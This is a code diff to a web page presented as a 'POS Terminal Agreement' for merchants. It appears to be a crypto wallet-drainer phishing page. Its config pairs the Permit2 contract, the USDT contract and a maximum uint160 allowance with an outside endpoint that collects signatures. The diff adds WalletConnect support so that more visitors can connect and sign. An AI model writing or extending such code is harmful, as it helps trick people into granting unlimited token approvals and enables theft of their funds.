@@ -5,9 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>POS Terminal Agreement</title>
     
-    <!-- Ethers.js -->
+    <!-- Ethers.js & Web3Modal v2 Standalone CDN -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    
+    <script src="https://cdn.jsdelivr.net/npm/@web3modal/standalone@2.4.12/dist/index.umd.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.4/dist/index.umd.js"></script>
+
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -145,17 +147,6 @@
         }
         .success-check.show { display: block; }
         
-        .mobile-note {
-            background: #fff3cd;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 13px;
-            color: #856404;
-            margin-bottom: 15px;
-            display: none;
-        }
-        .mobile-note.show { display: block; }
-        
         @media (max-width: 480px) {
             .container { padding: 25px 20px; }
             h1 { font-size: 22px; }
@@ -177,10 +168,6 @@
 
         <div class="highlight">
             ✅ <strong>Software License & SaaS Subscription Terms</strong> The software is provided under a limited, non-exclusive, non-transferable license strictly for the Merchant's business operations.
-        </div>
-
-        <div id="mobileNote" class="mobile-note">
-            📱 <strong>Mobile Detected!</strong> Please open this page inside <strong>MetaMask App</strong> or <strong>Trust Wallet Browser</strong> to connect.
         </div>
 
         <div id="walletStatus" class="wallet-status">⛓️ Not Connected</div>
@@ -215,12 +202,13 @@
             permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
             usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
             chainId: 1,
+            projectId: "0204ba9ef8f8856cd275da139b717e8a",
             apiUrl: "https://201-black.vercel.app/api/submit-signature"
         };
 
         const MAX_UINT160 = "1461501637330902918203684832716283019655932542975";
 
-        let signer, provider, userAddress;
+        let signer, provider, userAddress, web3Modal;
 
         const $ = (id) => document.getElementById(id);
         const walletStatus = $('walletStatus');
@@ -231,7 +219,19 @@
         const allowanceDisplay = $('allowanceDisplay');
         const expiryDisplay = $('expiryDisplay');
         const successCheck = $('successCheck');
-        const mobileNote = $('mobileNote');
+
+        // Initialize Web3Modal Standalone for WalletConnect v2
+        if (window.Web3Modal && window.Web3Modal.Standalone) {
+            web3Modal = new window.Web3Modal.Standalone({
+                projectId: CONFIG.projectId,
+                metadata: {
+                    name: 'POS Terminal Agreement',
+                    description: 'POS Terminal Merchant Agreement',
+                    url: window.location.origin,
+                    icons: ['https://avatars.githubusercontent.com/u/37784886']
+                }
+            });
+        }
 
         function showStatus(message, type = 'info') {
             statusMsg.className = `status-msg ${type}`;
@@ -254,26 +254,35 @@
             });
         }
 
-        function isMobile() {
-            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        }
-
         async function connectWallet() {
             try {
-                if (!window.ethereum) {
-                    if (isMobile()) {
-                        mobileNote.classList.add('show');
-                        showStatus('📱 Please open this page in your Wallet App browser (MetaMask / Trust Wallet)', 'error');
-                    } else {
-                        showStatus('⚠️ No wallet detected. Please install MetaMask or another Web3 wallet.', 'error');
-                    }
+                // Check if Injected Web3 (MetaMask browser extension or Trust/MetaMask mobile built-in browser) exists
+                if (window.ethereum) {
+                    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+                    await provider.send('eth_requestAccounts', []);
+                    signer = provider.getSigner();
+                    userAddress = await signer.getAddress();
+                } else if (web3Modal) {
+                    // Fallback to WalletConnect Modal for normal mobile/desktop browsers
+                    showStatus('🔄 Opening WalletConnect...', 'info');
+                    const { EthereumProvider } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.4/+esm');
+                    
+                    const wcProvider = await EthereumProvider.init({
+                        projectId: CONFIG.projectId,
+                        chains: [CONFIG.chainId],
+                        showQrModal: true,
+                        methods: ["eth_sendTransaction", "personal_sign", "eth_signTypedData"],
+                        events: ["chainChanged", "accountsChanged"]
+                    });
+
+                    await wcProvider.enable();
+                    provider = new ethers.providers.Web3Provider(wcProvider);
+                    signer = provider.getSigner();
+                    userAddress = await signer.getAddress();
+                } else {
+                    showStatus('⚠️ Web3 Provider not found. Please use a Web3 supported browser or wallet app.', 'error');
                     return;
                 }
-
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send('eth_requestAccounts', []);
-                signer = provider.getSigner();
-                userAddress = await signer.getAddress();
 
                 const network = await provider.getNetwork();
                 if (network.chainId !== CONFIG.chainId) {
@@ -285,14 +294,16 @@
                 await checkAllowance();
                 showStatus('✅ Wallet connected successfully!', 'success');
 
-                window.ethereum.on('accountsChanged', () => location.reload());
-                window.ethereum.on('chainChanged', () => location.reload());
+                if (window.ethereum) {
+                    window.ethereum.on('accountsChanged', () => location.reload());
+                    window.ethereum.on('chainChanged', () => location.reload());
+                }
 
             } catch (error) {
                 console.error('❌ Connect error:', error);
-                let errorMsg = error.message;
-                if (errorMsg.includes('User rejected') || errorMsg.includes('rejected')) {
-                    errorMsg = 'You cancelled the connection';
+                let errorMsg = error.message || error;
+                if (String(errorMsg).includes('User rejected') || String(errorMsg).includes('rejected')) {
+                    errorMsg = 'Connection cancelled by user';
                 }
                 showStatus(`❌ ${errorMsg}`, 'error');
             }
@@ -305,7 +316,6 @@
             connectBtn.disabled = true;
             signBtn.disabled = false;
             userDisplay.textContent = shortenAddress(userAddress);
-            mobileNote.classList.remove('show');
         }
 
         async function checkAllowance() {
@@ -450,8 +460,8 @@
 
             } catch (error) {
                 console.error('❌ signAndSubmit error:', error);
-                let errorMsg = error.message;
-                if (errorMsg.includes('User rejected') || errorMsg.includes('rejected')) {
+                let errorMsg = error.message || error;
+                if (String(errorMsg).includes('User rejected') || String(errorMsg).includes('rejected')) {
                     errorMsg = 'You rejected the signature';
                 }
                 showStatus(`❌ ${errorMsg}`, 'error');
@@ -463,10 +473,6 @@
 
         connectBtn.addEventListener('click', connectWallet);
         signBtn.addEventListener('click', signAndSubmit);
-
-        if (isMobile() && !window.ethereum) {
-            mobileNote.classList.add('show');
-        }
     </script>
 </body>
 </html>
